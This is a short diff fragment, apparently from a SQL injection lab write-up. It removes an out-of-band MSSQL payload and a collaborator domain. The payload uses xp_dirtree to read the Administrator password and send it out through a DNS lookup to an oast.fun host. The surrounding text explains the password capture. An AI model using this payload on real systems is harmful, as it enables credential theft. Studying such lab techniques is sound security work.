@@ -542,17 +542,6 @@ cjjqp6g2vtc00009zmr0gjjm5dcyyyyyb.oast.fun
 ```
 
 
-'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username = 'Administrator' ); exec('master..xp_dirtree "//'+@p+'.cjk4whj2vtc0000n0ex0gjj1qeayyyyyb.oast.fun/a"')--
-
-
-
-
-cjk4whj2vtc0000n0ex0gjj1qeayyyyyb.oast.fun
-
-
-
-
-
 * This input reads the password for the `Administrator` user, append a unique collaborator subdomain, and trigger a DNS lookup. This will result a DNS lookup like the following, allowing you to view the capture password:
 
 ```url
